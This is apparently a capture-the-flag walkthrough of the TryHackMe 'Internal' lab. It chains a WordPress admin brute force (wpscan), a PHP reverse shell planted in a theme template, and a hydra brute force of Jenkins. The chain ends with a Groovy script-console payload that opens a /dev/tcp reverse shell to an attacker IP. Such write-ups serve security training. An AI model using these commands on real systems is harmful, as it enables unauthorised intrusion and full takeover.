### Scanning

We will start with scanning our machine, Let's start by adding *internal.thm* to our /etc/hosts file and then start our nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### Enumeration

As we can see there is no much to look through so we will make the http port our first target, we will go to see what we have 

![img-description](/assets/img/Internal_Default.png)
_Default page_

and as we can see it's a default page for the apache server so we will try to fuzz the website directories using *ffuf*

#### Fuzzing

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u 'http://10.10.77.170/FUZZ' -r                       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\

          \/_/    \/_/   \/___/    \/_/

```

we found a directory called *blog* so we will head to it to see it's contents 

![img-description](/assets/img/Internal_blog.png)
_Blog_

i have found that the website is running on wordpress and i have found a login page which redirected me to the wp login page so i will start by trying a deafult credentials *Username:admin* *Password:admin*

![img-description](/assets/img/Internal_wp.png)
_wplogin_

We will find that it tells us *Error: The password you entered for the username admin is incorrect.* which means that there is a username called admin so we will try to get access to the system with this username

### Gaining access

We will use a tool called *wpscan* to try bruteforcing the password of the admin 

using this command

```
wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt
```

and we got a hit we now have access to the wp panel

![img-description](/assets/img/Internal_creds.png)
_AdminCreds_

#### Reverse Shell

Now we will go to Appearance > Theme Editor and on the right we will find something called 404 Template which as we can see a php code so we can change the code of this page to a php reverse shell to gain access to the webserver.

you can find the reverse shell here [Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![img-description](/assets/img/Internal_rev.png)
_ReverseShell_
 
 you must change your ip address and your port to open a nc listener with the port in the code and after this you can head to *internal.thm/blog/wp-content/themes/twentyseventeen/404.php* to execute our reverse shell and we will find that we got access

 ![img-description](/assets/img/Internal_access.png)
_Access_

#### User Access

Now we want to stabilize our shell so that we can exeplore our system more so we will use this command

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After that we will start by seeing the users on the system by viewing the */etc/passwd* file which contains the system users and we will find a user called *aubreanna*

```
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
```

in order to get access to this user i tried to explore the directories first and in the */opt* directory i have found a file named wp-save.txt
and it contains the user creds

 ![img-description](/assets/img/Internal_aubreanna.png)
_aubreanna_

And now we can get the user flag

```
aubreanna@internal:~$ cat user.txt
THM{int************}
```

### Privilege Escalation

We will find an intersting file called jenkins.txt so we will open it and we will find that it tells us that there is a jenkin service running *jenkin* is a standalone application for continuous integration and continuous delivery of software.

 ![img-description](/assets/img/Internal_jenkins.png)
_jenkins_

so in order to see it we must do local port forwarding using this command

```
ssh -L 9999:172.17.0.2:8080 aubreanna@10.10.77.170 
```

and now we can access it by typing in our browser *localhost:9999*

we will find that it is a default jenkins login page 

 ![img-description](/assets/img/Internal_JL.png)
_jenkinsLogin_

Now we can try to brute force it using hydra to see if we can get access, you can intercept the request in burpsuite to get the request and use this command 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9999 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"
```

we will find that we got a hit

 ![img-description](/assets/img/Internal_Jc.png)
_jenkinsCreds_

In order to get access we must find a place that we can get a reverse shell from so after some search you can go to Manage Jenkins > Tools and Actions > Script Console

we will find that we can *Type in an arbitrary Groovy script and execute it on the server.* so i will open a listener on my machine and execute the script

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.23.53.56/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

And from the listener we have opened we will find that we got access, when again seeing files in the directories in the */opt* we will find another root with the root password this time

 ![img-description](/assets/img/Internal_RootPass.png)
_Rootpass_

Now we can ssh to the root user and get our root flag

```
root@internal:~# cat root.txt
THM{d0ck3r_********}
```
